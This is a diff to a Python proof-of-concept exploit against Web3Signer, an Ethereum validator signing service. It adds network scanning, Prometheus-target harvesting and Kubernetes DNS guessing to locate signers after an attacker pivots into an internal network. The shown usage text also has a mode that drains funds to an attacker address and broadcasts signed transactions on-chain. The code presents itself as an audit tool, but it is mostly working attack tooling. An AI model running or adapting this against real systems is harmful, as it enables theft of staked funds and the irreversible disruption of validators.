@@ -15,6 +15,12 @@ Chain:
   → broadcast on-chain (irreversible damage)
 
 Usage:
+  # Discover Web3Signer instances from an adjacent host (scan local network)
+  python3 poc_signing_oracle.py --discover --cidr 10.0.0.0/24
+
+  # Discover via known Prometheus (reads targets to find Web3Signer)
+  python3 poc_signing_oracle.py --discover --prometheus http://prometheus:9090
+
   # Dry run (default) — enumerates keys and signs, but does NOT broadcast anything on-chain
   python3 poc_signing_oracle.py --target <HOST>:<PORT>
 
@@ -28,11 +34,14 @@ IMPORTANT: This is a security audit tool. Only use against systems you are autho
 """
 
 import argparse
+import ipaddress
 import json
+import socket
 import sys
 import time
 import urllib.request
 import urllib.error
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
 from typing import Optional
 
@@ -109,6 +118,154 @@ class Results:
     validator_registrations: list[SignedValidatorRegistration] = field(default_factory=list)
     eth1_transactions: list[SignedTransaction] = field(default_factory=list)
     ssrf_results: dict = field(default_factory=dict)
+
+
+# ---------------------------------------------------------------------------
+# Discovery: Find Web3Signer instances on the network
+# ---------------------------------------------------------------------------
+
+def discover_via_scan(cidr: str, port: int = 9000, threads: int = 50) -> list[str]:
+    """
+    Scan a CIDR range for Web3Signer instances by hitting /upcheck with Host: localhost.
+    This is what an attacker does after pivoting into the internal network
+    (e.g., from a compromised monitoring pod, beacon node, or any adjacent service).
+    """
+    print(f"\n[Discover] Scanning {cidr} port {port} for Web3Signer instances...")
+    network = ipaddress.ip_network(cidr, strict=False)
+    found = []
+
+    def check_host(ip: str) -> Optional[str]:
+        target = f"{ip}:{port}"
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            if result != 0:
+                return None
+            status, body = req(target, "GET", "/upcheck")
+            if status == 200:
+                return target
+        except Exception:
+            pass
+        return None
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {executor.submit(check_host, str(ip)): str(ip) for ip in network.hosts()}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                found.append(result)
+                print(f"  [+] FOUND Web3Signer at {result}")
+
+    if not found:
+        print(f"  [-] No Web3Signer instances found in {cidr}")
+    else:
+        print(f"  [+] Total found: {len(found)}")
+
+    return found
+
+
+def discover_via_prometheus(prometheus_url: str) -> list[str]:
+    """
+    Query a Prometheus instance to find Web3Signer targets.
+    Prometheus scrapes Web3Signer metrics (port 9001, also bound to 0.0.0.0).
+    The targets config reveals the internal hostname/IP of the signer.
+    Attack path: compromised Grafana/monitoring → read Prometheus targets → find signer.
+    """
+    print(f"\n[Discover] Querying Prometheus at {prometheus_url} for Web3Signer targets...")
+    found = []
+
+    try:
+        # Query Prometheus targets API
+        targets_url = f"{prometheus_url}/api/v1/targets"
+        request = urllib.request.Request(targets_url, headers={"Host": "localhost"})
+        with urllib.request.urlopen(request, timeout=5) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+
+        active_targets = data.get("data", {}).get("activeTargets", [])
+        for target in active_targets:
+            labels = target.get("labels", {})
+            address = target.get("scrapeUrl", "")
+            job = labels.get("job", "")
+
+            # Look for Web3Signer metrics targets (common job names)
+            if any(kw in job.lower() for kw in ["web3signer", "signer", "w3s"]):
+                print(f"  [+] Prometheus target: job={job} address={address}")
+                # Extract hostname, replace metrics port (9001) with signing port (9000)
+                try:
+                    from urllib.parse import urlparse
+                    parsed = urlparse(address)
+                    host = parsed.hostname
+                    signer_target = f"{host}:9000"
+                    # Verify it's actually a Web3Signer
+                    status, body = req(signer_target, "GET", "/upcheck")
+                    if status == 200:
+                        found.append(signer_target)
+                        print(f"  [+] CONFIRMED Web3Signer at {signer_target}")
+                except Exception:
+                    pass
+
+        # Also search for web3signer in metric names
+        if not found:
+            series_url = f"{prometheus_url}/api/v1/label/__name__/values"
+            request = urllib.request.Request(series_url, headers={"Host": "localhost"})
+            with urllib.request.urlopen(request, timeout=5) as resp:
+                metrics = json.loads(resp.read().decode("utf-8"))
+            signer_metrics = [m for m in metrics.get("data", [])
+                            if "signing" in m.lower() or "web3signer" in m.lower()]
+            if signer_metrics:
+                print(f"  [*] Found signer-related metrics: {signer_metrics[:5]}")
+                print(f"      Web3Signer exists in this monitoring stack — scan the network to find it")
+
+    except Exception as e:
+        print(f"  [-] Prometheus query failed: {e}")
+
+    return found
+
+
+def discover_via_dns(base_names: list[str] = None, port: int = 9000) -> list[str]:
+    """
+    Try common internal DNS names for Web3Signer in k8s/docker environments.
+    In k8s, services get DNS names like: web3signer.namespace.svc.cluster.local
+    """
+    if base_names is None:
+        base_names = [
+            "web3signer",
+            "web3-signer",
+            "signer",
+            "eth2-signer",
+            "validator-signer",
+            "web3signer.default",
+            "web3signer.staking",
+            "web3signer.ethereum",
+            "web3signer.validators",
+            "web3signer.default.svc.cluster.local",
+            "web3signer.staking.svc.cluster.local",
+        ]
+
+    print(f"\n[Discover] Trying common DNS names for Web3Signer...")
+    found = []
+
+    for name in base_names:
+        try:
+            ip = socket.gethostbyname(name)
+            target = f"{name}:{port}"
+            status, body = req(target, "GET", "/upcheck")
+            if status == 200:
+                found.append(target)
+                print(f"  [+] FOUND: {name} → {ip}:{port}")
+            else:
+                print(f"  [-] {name} → {ip} (port {port} returned {status})")
+        except socket.gaierror:
+            pass  # DNS name doesn't resolve — expected for most names
+        except Exception:
+            pass
+
+    if not found:
+        print(f"  [-] No DNS names resolved to a Web3Signer instance")
+
+    return found
 
 
 # ---------------------------------------------------------------------------
@@ -487,6 +644,11 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
+  # Phase 0: Discover Web3Signer from inside the network
+  python3 poc_signing_oracle.py --discover --cidr 10.0.0.0/24
+  python3 poc_signing_oracle.py --discover --prometheus http://prometheus:9090
+  python3 poc_signing_oracle.py --discover --dns
+
   # Dry run against a target (safe — no on-chain actions)
   python3 poc_signing_oracle.py --target 10.0.0.5:9000
 
@@ -502,7 +664,17 @@ Examples:
   python3 poc_signing_oracle.py --target 10.0.0.5:9000 \\
     --drain-to 0xAttackerAddr --broadcast
 """)
-    parser.add_argument("--target", required=True,
+    # Discovery options
+    parser.add_argument("--discover", action="store_true",
+                        help="Discovery mode — find Web3Signer instances on the network")
+    parser.add_argument("--cidr",
+                        help="CIDR range to scan (e.g. 10.0.0.0/24)")
+    parser.add_argument("--prometheus",
+                        help="Prometheus URL to query for Web3Signer targets")
+    parser.add_argument("--dns", action="store_true",
+                        help="Try common k8s/docker DNS names for Web3Signer")
+    # Target (required unless discovery mode)
+    parser.add_argument("--target",
                         help="Web3Signer host:port (e.g. 10.0.0.5:9000)")
     parser.add_argument("--beacon-node",
                         help="Beacon node URL for broadcasting exits (e.g. http://beacon:5052)")
@@ -527,6 +699,36 @@ Examples:
     print("=" * 70)
     print("Web3Signer Signing Oracle — Full Chain PoC")
     print("=" * 70)
+
+    # -----------------------------------------------------------------------
+    # Discovery mode: find Web3Signer instances
+    # -----------------------------------------------------------------------
+    if args.discover:
+        targets = []
+        if args.cidr:
+            targets.extend(discover_via_scan(args.cidr))
+        if args.prometheus:
+            targets.extend(discover_via_prometheus(args.prometheus))
+        if args.dns:
+            targets.extend(discover_via_dns())
+        if not args.cidr and not args.prometheus and not args.dns:
+            # Default: try DNS first (free), then common subnets
+            targets.extend(discover_via_dns())
+
+        if targets:
+            print(f"\n{'='*70}")
+            print(f"DISCOVERED {len(targets)} Web3Signer INSTANCE(S):")
+            for t in targets:
+                print(f"  {t}")
+            print(f"\nRe-run with: --target {targets[0]}")
+            print(f"{'='*70}")
+        else:
+            print("\n[!] No instances found. Try --cidr with a wider range.")
+        sys.exit(0)
+
+    if not args.target:
+        parser.error("--target is required (or use --discover to find instances)")
+
     print(f"Target:    {args.target}")
     print(f"Broadcast: {'YES — DESTRUCTIVE' if args.broadcast else 'No (dry run)'}")
 
